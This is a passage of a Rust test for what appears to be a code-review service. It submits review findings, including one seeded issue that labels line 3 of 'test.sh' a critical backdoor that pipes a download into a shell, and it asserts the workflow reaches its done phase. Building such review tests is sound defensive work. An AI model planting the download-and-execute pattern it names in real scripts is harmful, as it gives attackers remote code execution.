            json!([{ "path": "test.sh", "start": 3, "end": 3, "kind": "backdoor", "severity": "critical", "note": "pipes a download into a shell" }])
        } else {
            marker_issues(task["diff"].as_str().unwrap()).into()
        };
        let (s, v) = api.call(
            "POST",
            &format!("/v1/reviews/{id}"),
            Some(&cautious),
            Some(json!({ "issues": issues })),
        );
        assert_eq!(s, 200, "{v}");
        if id == t2 {
            assert_eq!(v["next"]["phase"], "done", "{v}");
            got = true;
            break;
        }
    }
    assert!(got);
}
